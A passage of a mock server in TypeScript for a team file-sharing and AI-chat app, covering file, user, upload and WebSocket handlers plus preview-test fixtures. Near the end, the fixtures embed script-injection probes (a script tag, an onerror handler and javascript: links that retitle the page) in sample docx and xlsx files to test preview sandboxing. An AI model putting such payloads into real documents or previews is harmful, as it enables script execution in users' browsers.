          this.files.set(c.body.to + p.slice(c.body.from.length), v)
        }
      }
      return { entry: this.entry(c.body.to, n, c.user) }
    },
    remove: (c) => {
      const n = this.files.get(c.query.path!) ?? fail('not_found', 404)
      this.files.delete(c.query.path!)
      const item = { id: uuidv7(), originalPath: c.query.path!, size: n.data?.byteLength ?? 0, deletedBy: { id: c.user.id, name: c.user.name }, turnId: null, deletedAt: now(), purgeAt: new Date(Date.now() + 30 * 86400_000).toISOString(), node: n }
      this.trash.push(item)
      return { trashId: item.id, purgeAt: item.purgeAt }
    },
    history: (c) => {
      const f = this.files.get(c.query.path!)
      return { path: c.query.path, items: this.versions.filter((v) => v.path === c.query.path), currentSha256: f?.data ? sha256Hex(f.data) : null, canRestore: this.access(c.query.path!, c.user) === 'write' }
    },
    versionDownload: (c) => {
      const v = this.versions.find((x) => x.id === c.params.versionId) ?? fail('not_found', 404)
      return new Response(`version ${v.version}`, { headers: { 'content-disposition': 'attachment' } })
    },
    restoreVersion: (c) => {
      const v = this.versions.find((x) => x.id === c.body.versionId) ?? fail('not_found', 404)
      if (this.access(v.path, c.user) !== 'write') fail('forbidden', 403)
      this.versions.push({ ...v, id: uuidv7(), version: this.versions.filter((x) => x.path === v.path).length + 1, kind: 'restore', createdAt: now() })
      return { path: v.path, conflict: false, entry: this.entry(v.path, this.files.get(v.path)!, c.user) }
    },
    trash: () => ({ items: this.trash.map(({ node: _n, ...t }) => t), nextCursor: null }),
    restoreTrash: (c) => {
      const t = this.trash.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      this.trash = this.trash.filter((x) => x.id !== t.id)
      this.files.set(t.originalPath, t.node)
      return { entry: this.entry(t.originalPath, t.node, c.user) }
    },
    attachTeamFile: (c) => {
      const path: string = c.body.path
      const n = this.files.get(path)
      if (!n || n.type !== 'file' || this.access(path, c.user) === 'none') fail('not_found', 404)
      const name = path.slice(path.lastIndexOf('/') + 1)
      const mime = mimeOf(path) ?? 'application/octet-stream'
      const a: Attachment & { data: Uint8Array } = {
        id: uuidv7(), name, path, size: n!.data!.byteLength, mime, kind: mime.startsWith('image/') ? 'image' : 'text', source: 'team',
        sha256: new Bun.CryptoHasher('sha256').update(n!.data!).digest('hex'), data: n!.data!,
      }
      this.attachments.set(a.id, a)
      return { status: 201, body: (({ data: _d, ...rest }) => rest)(a) }
    },
    findFiles: (c) => {
      const q = String(c.query.q ?? '').toLowerCase()
      const base = String(c.query.path ?? '')
      const items = [...this.files.entries()]
        .filter(([p, n]) => n.type === 'file' && (!base || p.startsWith(base + '/')) && p.slice(p.lastIndexOf('/') + 1).toLowerCase().includes(q) && this.access(p, c.user) !== 'none' && !(p.startsWith('users/') && !p.startsWith(`users/${c.user.id}/`)))
        .map(([p, n]) => this.entry(p, n, c.user))
      return { items: items.slice(0, Number(c.query.limit ?? 50)), truncated: false }
    },
    recentFiles: (c) => {
      const items = [...this.files.entries()]
        .filter(([p, n]) => n.type === 'file' && this.access(p, c.user) !== 'none' && !p.startsWith('users/'))
        .sort((a, b) => b[1].mtime.localeCompare(a[1].mtime))
        .map(([p, n]) => this.entry(p, n, c.user))
      return { items: items.slice(0, Number(c.query.limit ?? 20)), truncated: false }
    },
    uploadAttachment: async (c) => {
      const data = new Uint8Array(await c.file!.arrayBuffer())
      return { status: 201, body: this.makeAttachment(c.body.chatId, c.body.name ?? c.file!.name, data, c.file!.type, c.user) }
    },
    attachmentThumbnail: (c) => {
      const a = this.attachments.get(c.params.id!) ?? fail('not_found', 404)
      return new Response(a.data as unknown as BodyInit, { headers: { 'content-type': a.mime } })
    },
    createUploadSession: (c) => {
      const s: UploadSession & { chunks: Map<number, Uint8Array> } = { id: uuidv7(), target: c.body.target, size: c.body.size, sha256: c.body.sha256, chunkSize: UPLOAD_CHUNK_SIZE, chunkCount: Math.ceil(c.body.size / UPLOAD_CHUNK_SIZE), received: [], expiresAt: new Date(Date.now() + 86400_000).toISOString(), chunks: new Map() }
      this.uploads.set(s.id, s)
      const { chunks: _x, ...out } = s
      return { status: 201, body: out }
    },
    uploadChunk: async (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      s.chunks.set(Number(c.params.n), new Uint8Array(await c.req.arrayBuffer()))
      s.received = [...s.chunks.keys()].sort((a, b) => a - b)
      return { received: s.received }
    },
    getUploadSession: (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      const { chunks: _x, ...out } = s
      return out
    },
    completeUploadSession: async (c) => {
      const s = this.uploads.get(c.params.id!) ?? fail('gone', 410)
      const all = new Uint8Array(s.size)
      for (const [n, d] of s.chunks) all.set(d, n * s.chunkSize)
      const hash = new Bun.CryptoHasher('sha256').update(all).digest('hex')
      if (hash !== s.sha256) fail('conflict', 409, 'sha256 mismatch')
      this.uploads.delete(s.id)
      if (s.target.kind === 'path') {
        this.putFile(s.target.path, all)
        return { kind: 'path', entry: this.entry(s.target.path, this.files.get(s.target.path)!, c.user) }
      }
      if (s.target.kind === 'attachment') return { kind: 'attachment', attachment: this.makeAttachment(s.target.chatId, s.target.name, all, 'application/octet-stream', c.user) }
      return { kind: 'transcribe', jobId: this.transcribeJob(c.user) }
    },
    cancelUploadSession: (c) => {
      this.uploads.delete(c.params.id!)
      return undefined
    },
    listChatArtifacts: (c) => {
      const keys = [...new Set(this.artifacts.filter((a) => a.chatId === c.params.id).map((a) => a.key))]
      return { items: keys.map((key) => ({ key, versions: this.artifacts.filter((a) => a.chatId === c.params.id && a.key === key).sort((a, b) => b.version - a.version).map(({ content, ...s }) => ({ ...s, size: content.length })) })) }
    },
    getArtifact: (c) => this.artifacts.find((a) => a.id === c.params.id) ?? fail('not_found', 404),
    getJob: (c) => this.jobs.get(c.params.id!) ?? fail('not_found', 404),
    cancelJob: (c) => {
      const j = this.jobs.get(c.params.id!) ?? fail('not_found', 404)
      j.status = 'canceled'
      return j
    },
    transcribe: (c) => ({ status: 202, body: { jobId: this.transcribeJob(c.user) } }),
    pollCalls: () => ({ calls: [] }),
    postResult: () => undefined,

    listUsers: () => ({ items: this.users }),
    createUser: (c) => {
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: c.body.role, groupIds: c.body.groupIds ?? [], mustChangePassword: true, localeChoice: c.body.locale ?? null }, c.body.temporaryPassword ?? 'tiger427')
      return { status: 201, body: { user: u, temporaryPassword: c.body.temporaryPassword ?? 'tiger427' } }
    },
    updateUser: (c) => {
      const { locale, ...rest } = c.body
      const u = Object.assign(this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404), Object.fromEntries(Object.entries(rest).filter(([, v]) => v !== undefined)))
      if (locale !== undefined) u.localeChoice = locale
      this.syncLocales()
      return u
    },
    deleteUser: (c) => {
      this.users = this.users.filter((u) => u.id !== c.params.id)
      return undefined
    },
    resetPassword: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const temp = c.body?.temporaryPassword ?? 'maple385'
      this.passwords.set(u!.username, temp)
      u!.mustChangePassword = true
      this.resets.set(u!.id, { by: { id: c.user.id, name: c.user.name }, at: now() })
      return { temporaryPassword: temp }
    },
    createResetLink: (c) => {
      const u = this.users.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      if (u.role === 'owner') fail('forbidden', 403)
      const token = 'rst' + uuidv7().replace(/-/g, '')
      return { token, url: `/reset-password/${token}`, expiresAt: new Date(Date.now() + 24 * 3600_000).toISOString() }
    },
    listInvites: () => ({ items: this.invites.map(({ token: _t, ...i }) => i) }),
    createInvite: (c) => {
      const token = 'inv' + uuidv7().replace(/-/g, '')
      const i = { id: uuidv7(), role: c.body.role ?? 'member', groupIds: c.body.groupIds ?? [], createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), expiresAt: new Date(Date.now() + (c.body.expiresInHours ?? 72) * 3600_000).toISOString(), usedAt: null, usedBy: null, token }
      this.invites.push(i)
      const { token: _t, ...invite } = i
      return { status: 201, body: { invite, token, url: `/invite/${token}` } }
    },
    revokeInvite: (c) => {
      this.invites = this.invites.filter((i) => i.id !== c.params.id)
      return undefined
    },
    listGroups: () => ({ items: this.groups }),
    createGroup: (c) => {
      const g: Group = { id: uuidv7(), name: c.body.name, description: c.body.description ?? null, memberIds: c.body.memberIds ?? [] }
      this.groups.push(g)
      return { status: 201, body: g }
    },
    updateGroup: (c) => Object.assign(this.groups.find((g) => g.id === c.params.id) ?? fail('not_found', 404), Object.fromEntries(Object.entries(c.body).filter(([, v]) => v !== undefined))),
    deleteGroup: (c) => {
      this.groups = this.groups.filter((g) => g.id !== c.params.id)
      return undefined
    },
    listFolders: () => ({ items: this.folders }),
    createFolder: (c) => {
      const f: Folder = { id: uuidv7(), path: c.body.path, exists: true, createdAt: now(), rules: [] }
      f.rules = (c.body.rules ?? []).map((r: Json) => ({ id: uuidv7(), folderId: f.id, subjectType: r.subjectType, subjectId: r.subjectId ?? null, access: r.access, updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }))
      this.folders.push(f)
      return { status: 201, body: f }
    },
    putFolderRules: (c) => {
      const f = this.folders.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      f.rules = c.body.rules.map((r: Json) => ({ id: uuidv7(), folderId: f.id, subjectType: r.subjectType, subjectId: r.subjectId ?? null, access: r.access, updatedBy: { id: c.user.id, name: c.user.name }, updatedAt: now() }))
      return f
    },
    deleteFolder: (c) => {
      this.folders = this.folders.filter((f) => f.id !== c.params.id)
      return undefined
    },
    previewRules: (c) => ({
      folders: c.body.changes.map((ch: Json) => ({ path: ch.path, users: this.users.map((u) => ({ user: { id: u.id, name: u.name }, role: u.role, before: u.role === 'owner' ? 'write' : 'none', after: u.role === 'owner' ? 'write' : (ch.rules as Json[]).some((r) => r.subjectType === 'everyone') ? 'read' : 'none' })) })),
      losing: [{ user: { id: 'bob', name: 'Bob' }, paths: [c.body.changes[0].path], chatsReset: 2 }],
    }),
    engines: () => this.enginesResponse(),
    updateEngines: (c) => {
      if (c.body.defaultEngine) this.settings.defaultEngine = c.body.defaultEngine
      if (c.body.concurrency) this.settings.concurrency = c.body.concurrency
      return this.enginesResponse()
    },
    checkEngine: (c) => this.enginesResponse().engines.find((e) => e.id === c.params.id) ?? fail('not_found', 404),
    listBudgets: () => ({ items: this.budgets }),
    createBudget: (c) => {
      const b: Budget = { id: uuidv7(), subjectType: c.body.subjectType, subjectId: c.body.subjectId, period: c.body.period, limitUsd: c.body.limitUsd, limitTokens: c.body.limitTokens ?? null, action: c.body.action, usedUsd: 0, usedTokens: 1234 }
      this.budgets.push(b)
      return { status: 201, body: b }
    },
    updateBudget: (c) => Object.assign(this.budgets.find((b) => b.id === c.params.id) ?? fail('not_found', 404), c.body),
    deleteBudget: (c) => {
      this.budgets = this.budgets.filter((b) => b.id !== c.params.id)
      return undefined
    },
    settings: () => this.settings,
    updateSettings: (c) => {
      const before = this.settings.defaultLocale
      Object.assign(this.settings, c.body)
      this.syncLocales()
      if (this.settings.defaultLocale !== before) this.publish(LOCALE_CHANGED)
      return this.settings
    },
    usage: () => ({ from: now(), to: now(), rows: [{ key: 'olga', label: 'Olga', turns: 12, inputTokens: 12000, outputTokens: 3400, costUsd: 0.42 }, { key: 'bob', label: 'Bob', turns: 3, inputTokens: 2000, outputTokens: 700, costUsd: 0.05 }], totals: { turns: 15, inputTokens: 14000, outputTokens: 4100, costUsd: 0.47 } }),
    audit: () => ({ items: [{ id: 'a1', source: 'admin', at: now(), actor: { id: 'olga', name: 'Olga' }, action: 'invite.create', target: 'member', turnId: null, detail: { role: 'member' } } satisfies AuditEntry], nextCursor: null }),
    diagnostics: () => ({ version: this.serverVersion, host: { os: 'darwin', arch: 'arm64', hostname: 'mac-mini' }, disk: { teamFolderFreeBytes: 500e9, dataFreeBytes: 500e9 }, queue: { running: 0, queued: 0, concurrency: 2 }, checks: [{ id: 'relay', group: 'relay', label: 'Relay connection', status: 'warn', detail: 'Relay not configured (dev)' }, { id: 'disk', group: 'disk', label: 'Disk space', status: 'ok', detail: null }], generatedAt: now() }),
    updateStatus: () => ({ current: this.serverVersion, channel: 'stable', available: null, lastCheckedAt: now(), previous: null }),
    listBackups: () => ({ items: [{ id: 'b1', kind: 'daily', createdAt: now(), size: 123456, scope: 'full' }] }),
    startBackup: (c) => {
      const id = uuidv7()
      const job: Job = { id, kind: 'backup', status: 'running', progress: 0, message: 'Backing up', result: null, error: null, createdAt: now(), finishedAt: null }
      this.jobs.set(id, job)
      setTimeout(() => this.publish({ type: 'job.progress', data: { jobId: id, kind: 'backup', progress: 0.5, message: 'Copying database' } }), 50)
      setTimeout(() => {
        Object.assign(job, { status: 'done', progress: 1, result: { backupId: 'b2', size: 999, createdAt: now() }, finishedAt: now() })
        this.publish({ type: 'job.done', data: { job } })
      }, 200)
      void c
      return { status: 202, body: { jobId: id } }
    },
    connection: () => this.connection,
    updateConnection: (c) => {
      if (c.body.password !== OWNER_PASSWORD) fail('forbidden', 403)
      if (!(this.connection.availableModes ?? []).includes(c.body.mode)) fail('conflict', 409, 'This connection mode is not available in this version yet.')
      if (c.body.mode !== 'direct-only' && !(c.body.teamName ?? this.connection.teamName)) fail('validation', 400)
      this.connection = { ...this.connection, mode: c.body.mode, teamName: c.body.teamName ?? this.connection.teamName, state: c.body.mode === 'direct-only' ? 'disabled' : 'connecting', detail: 'Applies after the server restarts.' }
      return this.connection
    },
    connectInfo: () => ({ teamId: 'team-acme', lanCertSha256: null, lanPort: 8443, lanHosts: [], canonicalOrigin: null }),
  }

  enginesResponse() {
    return {
      engines: [
        { id: 'claude-code' as const, label: 'Claude Code', enabled: true, authMode: 'local-login' as const, installed: true, version: '2.1.305', status: 'ok' as const, detail: null, models: [{ id: 'claude-sonnet', label: 'Sonnet' }, { id: 'claude-opus', label: 'Opus' }], checkedAt: now() },
        { id: 'codex' as const, label: 'Codex', enabled: true, authMode: 'local-login' as const, installed: true, version: '0.163.0', status: 'not_logged_in' as const, detail: 'Run `codex login --device-auth` on the server Mac.', models: [], checkedAt: now() },
      ],
      defaultEngine: this.settings.defaultEngine,
      defaultModel: this.settings.defaultModel,
      concurrency: this.settings.concurrency,
      accounts: [],
    }
  }

  makeAttachment(chatId: string, name: string, data: Uint8Array, mime: string, user: User): Attachment {
    const a: Attachment & { data: Uint8Array } = { id: uuidv7(), name, path: `users/${user.id}/.attachments/${chatId}/${name}`, size: data.byteLength, mime: mime || 'application/octet-stream', kind: mime.startsWith('image/') ? 'image' : mime.startsWith('audio/') ? 'audio' : 'other', data }
    this.attachments.set(a.id, a)
    this.putFile(a.path, data)
    const { data: _d, ...out } = a
    return out
  }

  transcribeJob(user: User): string {
    const id = uuidv7()
    const job: Job = { id, kind: 'transcribe', status: 'running', progress: null, message: null, result: null, error: null, createdAt: now(), finishedAt: null }
    this.jobs.set(id, job)
    setTimeout(() => {
      Object.assign(job, { status: 'done', progress: 1, result: { text: '받아쓴 문장입니다', language: 'ko', durationSec: 2 }, finishedAt: now() })
      this.publish({ type: 'job.done', data: { job } })
    }, 150)
    void user
    return id
  }

  // ---------------- HTTP ----------------
  routes = listEndpoints().map(({ name, ep }) => ({ name, ep, re: new RegExp('^' + ep.path.replace(/:([A-Za-z_]+)/g, '(?<$1>[^/]+)') + '$') }))

  async handle(req: Request, dist: string): Promise<Response> {
    const url = new URL(req.url)
    const p = url.pathname
    if (p.startsWith('/__test/')) return this.testControl(p, req)
    if (!p.startsWith('/api/')) return pageHeaders(serveWeb(req, { dist, downloads: null, dev: false, devPort: 0 }) ?? new Response('no', { status: 404 }))
    this.log.push(`${req.method} ${p}`)
    const route = this.routes.find((r) => r.ep.method === req.method && r.re.test(p))
    try {
      if (!route) return fail('not_found', 404)
      const h = this.handlers[route.name]
      if (!h) return fail('not_found', 404, `mock: ${route.name} not implemented`)
      if (req.method !== 'GET' && !req.headers.get(CSRF_HEADER)) fail('csrf', 403)
      const ep = route.ep as Endpoint
      const user = this.userOf(req)
      if (ep.auth !== 'public') {
        if (!user) fail('unauthorized', 401)
        if ((ep.auth === 'admin' && user!.role === 'member') || ((ep.auth === 'owner' || ep.auth === 'owner-reauth') && user!.role !== 'owner')) fail('forbidden', 403)
        // like the server: a temporary password reaches only the endpoints that change it
        if (user!.mustChangePassword && !ep.allowWhilePasswordChange) fail('password_change_required', 403)
      }
      const params = Object.fromEntries(Object.entries(route.re.exec(p)!.groups ?? {}).map(([k, v]) => [k, decodeURIComponent(v)]))
      const query = Object.fromEntries(url.searchParams.entries())
      if (ep.query && isSchema(ep.query)) {
        const q = ep.query.safeParse(query)
        if (!q.success) fail('validation', 400, JSON.stringify(q.error.issues))
      }
      let body: any
      let file: File | undefined
      if (ep.body && isSchema(ep.body)) {
        const parsed = (ep.body as z.ZodType).safeParse(await req.json())
        if (!parsed.success) fail('validation', 400, JSON.stringify(parsed.error.issues))
        body = parsed.data
      } else if (ep.body && (ep.body as { kind: string }).kind === 'multipart') {
        const fd = await req.formData()
        const fields: Json = {}
        for (const [k, v] of fd.entries()) if (typeof v === 'string') fields[k] = v
        const parsed = (ep.body as { fields: z.ZodType }).fields.safeParse(fields)
        if (!parsed.success) fail('validation', 400, JSON.stringify(parsed.error.issues))
        body = parsed.data
        file = fd.get('file') as File
      }
      const out = await h({ user: user!, params, query, body, req, file })
      if (out instanceof Response) return out
      const o = (out && typeof out === 'object' && ('body' in (out as Json) || 'cookie' in (out as Json)) && !('id' in (out as Json)) ? out : { body: out }) as { status?: number; body: unknown; cookie?: string }
      const status = o.status ?? ep.status ?? 200
      const headers: Record<string, string> = { 'content-type': 'application/json' }
      if (o.cookie) headers['set-cookie'] = o.cookie
      if (status === 204 || (!isSchema(ep.response) && (ep.response as { kind: string }).kind === 'empty')) return new Response(null, { status: 204, headers: o.cookie ? { 'set-cookie': o.cookie } : {} })
      // the mock must speak the contract exactly: a mismatch here is a bug in the mock or the contract changed
      const checked = (ep.response as z.ZodType).parse(o.body)
      return new Response(JSON.stringify(checked), { status, headers })
    } catch (e) {
      if (e instanceof Fail) return new Response(JSON.stringify(ApiErrorResponse.parse({ error: { code: e.code, message: e.message } })), { status: e.status, headers: { 'content-type': 'application/json' } })
      console.error('mock error', req.method, p, e)
      return new Response(JSON.stringify({ error: { code: 'internal', message: String(e) } }), { status: 500, headers: { 'content-type': 'application/json' } })
    }
  }

  async testControl(p: string, req: Request): Promise<Response> {
    const body = (await req.json().catch(() => ({}))) as Json
    if (p === '/__test/reset') this.reset({ setup: !!body.setup, teamLocale: Locale.safeParse(body.teamLocale).data, usersFollowTeam: !!body.usersFollowTeam, mustChange: typeof body.mustChange === 'string' ? body.mustChange : undefined })
    else if (p === '/__test/drop-ws') for (const ws of this.sockets) ws.close(WsClose.serviceRestart, 'restart')
    else if (p === '/__test/server-version') this.serverVersion = String(body.version)
    else if (p === '/__test/memory') this.memories.push({ id: uuidv7(), text: String(body.text), sourceChatId: null, createdAt: now() })
    else if (p === '/__test/log') return Response.json(this.log)
    else if (p === '/__test/revoke') {
      // like the server after a folder-rule change: the folder is gone for everyone, who get an access_changed notice
      this.revoked.add(String(body.path))
      this.publish({ type: 'notice', data: { level: 'info', code: 'access_changed', message: String(body.path) } })
    }
    return Response.json({ ok: true })
  }

  serve(port: number, dist: string) {
    const self = this
    return Bun.serve<WsData, never>({
      port,
      hostname: '127.0.0.1',
      async fetch(req, server) {
        const url = new URL(req.url)
        if (url.pathname === WS_PATH) {
          const user = self.userOf(req)
          const after = url.searchParams.get('after')
          const data: WsData = { user: user?.id ?? '', windowId: url.searchParams.get('windowId') ?? '', epoch: url.searchParams.get('epoch'), after: after === null ? null : Number(after) }
          const ok = server.upgrade(req, { data, headers: { 'sec-websocket-protocol': 'mycel.v1' } })
          return ok ? undefined : new Response('upgrade failed', { status: 400 })
        }
        return self.handle(req, dist)
      },
      websocket: {
        open(ws) {
          if (!ws.data.user) return ws.close(WsClose.unauthorized, 'sign in')
          self.sockets.add(ws)
          const hello = (resumed: boolean) => JSON.stringify({ type: 'hello', epoch: self.epoch, seq: self.seq, resumed, windowId: ws.data.windowId, serverVersion: self.serverVersion, pingIntervalMs: 20000 })
          const { epoch, after } = ws.data
          if (epoch && epoch !== self.epoch) {
            ws.send(hello(false))
            ws.send(JSON.stringify({ type: 'reset', epoch: self.epoch, seq: self.seq, reason: 'epoch_mismatch' }))
          } else if (epoch && after !== null) {
            const oldest = self.buffer[0]?.seq ?? self.seq + 1
            if (after + 1 < oldest) {
              ws.send(hello(false))
              ws.send(JSON.stringify({ type: 'resync', epoch: self.epoch, seq: self.seq, reason: 'buffer_overflow' }))
            } else {
              ws.send(hello(true))
              for (const b of self.buffer) if (b.seq > after) ws.send(b.text)
            }
          } else ws.send(hello(false))
        },
        message(ws, msg) {
          const f = JSON.parse(String(msg)) as { type: string; t?: number }
          if (f.type === 'ping') ws.send(JSON.stringify({ type: 'pong', t: f.t ?? 0 }))
        },
        close(ws) {
          self.sockets.delete(ws)
        },
      },
    })
  }
}

function mimeOf(path: string): string | null {
  const e = path.toLowerCase().split('.').pop() ?? ''
  return ({ md: 'text/markdown', csv: 'text/csv', txt: 'text/plain', html: 'text/html', png: 'image/png', jpg: 'image/jpeg', pdf: 'application/pdf', json: 'application/json' } as Record<string, string>)[e] ?? null
}

function defaultSettings(): TeamSettings {
  return { teamName: 'Acme', defaultLocale: 'ko', defaultEngine: 'claude-code', defaultModel: null, concurrency: 2, updateChannel: 'stable', updateWindow: null, auditRetentionDays: 365, fileHistoryRetentionDays: 90, trashRetentionDays: 30, chatTrashRetentionDays: 7 }
}

/** What the real server's securityHeaders() middleware adds to every non-/api response (server/src/http/middleware.ts). */
function pageHeaders(res: Response): Response {
  const h = new Headers(res.headers)
  h.set('X-Content-Type-Options', 'nosniff')
  h.set('Referrer-Policy', 'same-origin')
  h.set('X-Frame-Options', 'DENY')
  h.set('Cross-Origin-Opener-Policy', 'same-origin')
  return new Response(res.body, { status: res.status, headers: h })
}

/** pandoc's docx with an altChunk (an HTML part docx-preview would draw in an unsandboxed srcdoc iframe). */
function withAltChunk(docx: string): boolean {
  const dir = `${docx}.d`
  try {
    fs.rmSync(dir, { recursive: true, force: true })
    if (Bun.spawnSync(['unzip', '-q', docx, '-d', dir]).exitCode !== 0) return false
    fs.writeFileSync(`${dir}/word/chunk.html`, '<html><body><p>alt chunk</p><script>top.document.title = "pwned-altchunk"</script><img src="x" onerror="top.document.title = \'pwned-altchunk\'"></body></html>')
    const doc = `${dir}/word/document.xml`
    fs.writeFileSync(doc, fs.readFileSync(doc, 'utf8').replace('</w:body>', '<w:altChunk r:id="rIdAlt1"/></w:body>').replace(/(<w:sectPr[\s\S]*?<\/w:sectPr>)(<w:altChunk r:id="rIdAlt1"\/>)/, '$2$1'))
    const rels = `${dir}/word/_rels/document.xml.rels`
    fs.writeFileSync(rels, fs.readFileSync(rels, 'utf8').replace('</Relationships>', '<Relationship Id="rIdAlt1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" Target="chunk.html"/></Relationships>'))
    const types = `${dir}/[Content_Types].xml`
    fs.writeFileSync(types, fs.readFileSync(types, 'utf8').replace('</Types>', '<Override PartName="/word/chunk.html" ContentType="text/html"/></Types>'))
    fs.rmSync(docx)
    return Bun.spawnSync(['zip', '-q', '-r', '-X', docx, '.'], { cwd: dir }).exitCode === 0
  } finally {
    fs.rmSync(dir, { recursive: true, force: true })
  }
}

let office: [string, Uint8Array][] | null = null
/** PDF / xlsx / docx / pptx samples for the preview tests (docx and pptx need pandoc; skipped without it). */
function officeFixtures(): [string, Uint8Array][] {
  if (office) return office
  const out: [string, Uint8Array][] = [['docs/handbook.pdf', makePdf(['Company Handbook 2026', 'Section 1: Working hours are flexible.'])]]
  const wb = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(wb, XLSX.utils.aoa_to_sheet([['month', 'spend'], ['July', 1200], ['August', 900]]), 'Q3 spend')
  out.push(['docs/spend.xlsx', new Uint8Array(XLSX.write(wb, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  // a sheet whose cells link to javascript: and to a web page
  const links = XLSX.utils.aoa_to_sheet([['evil cell', 'web cell']])
  links.A1!.l = { Target: 'javascript:top.document.title="pwned-xlsx"' }
  links.B1!.l = { Target: 'https://example.com/sheet' }
  const wb2 = XLSX.utils.book_new()
  XLSX.utils.book_append_sheet(wb2, links, 'links')
  out.push(['docs/links.xlsx', new Uint8Array(XLSX.write(wb2, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer)])
  const docs = [
    ['brand.docx', 'docx', '# Brand guidelines\n\nPrimary color: mint.\n'],
    ['kickoff.pptx', 'pptx', '# Q4 kickoff\n\n- Launch in November\n'],
    ['links.docx', 'docx', '# Links\n\n[evil link](javascript:top.document.title="pwned-docx") and [web link](https://example.com/doc) and [app link](/admin/members)\n'],
  ] as const
  for (const [name, to, md] of docs) {
    try {
      const tmp = `${process.env.TMPDIR ?? '/tmp'}/mycel-mock-${process.pid}-${name}`
      const p = Bun.spawnSync(['pandoc', '-f', 'markdown', '-t', to, '-o', tmp], { stdin: enc.encode(md) })
      if (p.exitCode === 0 && (name !== 'links.docx' || withAltChunk(tmp))) {
        out.push([`docs/${name}`, new Uint8Array(fs.readFileSync(tmp))])
        fs.rmSync(tmp, { force: true })
      }
    } catch { /* no pandoc: no docx/pptx sample */ }
  }
  return (office = out)
}
